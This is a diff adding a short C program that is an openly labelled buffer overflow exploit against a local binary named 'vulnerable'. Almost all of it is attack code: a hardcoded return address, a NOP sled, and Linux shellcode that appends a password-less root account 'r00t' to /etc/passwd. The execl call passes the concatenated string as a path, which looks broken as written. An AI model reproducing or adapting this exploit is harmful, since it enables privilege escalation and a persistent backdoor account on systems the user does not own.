@@ -1,0 +1,42 @@
+int main()
+{
+printf("Buffer Overflow by ::[CypherXero]::\n");
+
+char exploit[300] = "./vulnerable ";
+
+/* EIP Address */
+/* 4 Byte Return Address */
+char ret[] = "\xe8\xfb\xff\xbf";
+
+/* Our NOP-slide, paving the way for shellcode execution */
+/* 55 Bytes */
+char nopslide[] =
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+
+/* add user r00t to /etc/password */
+/* shellcode from milw0rm.com */
+/* 69 Bytes */
+char shellcode[] =
+
+"\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68"
+"\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x66"
+"\xb9\x01\x04\xcd\x80\x89\xc3\x6a\x04\x58\x31\xd2"
+"\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68"
+"\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x6a"
+"\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80";
+
+/* Let's build the buffer overflow */
+strcat(exploit, nopslide);                      /* 55 Bytes */
+strcat(exploit, shellcode);                     /* 69 Bytes  */
+strcat(exploit, ret);                           /* 4 Bytes   */
+/* TOTAL: 128 Bytes */
+
+printf("Exploiting ......\n");
+execl(exploit, 0);
+printf("Exploitation Finished!\n");
+return 0;
+}
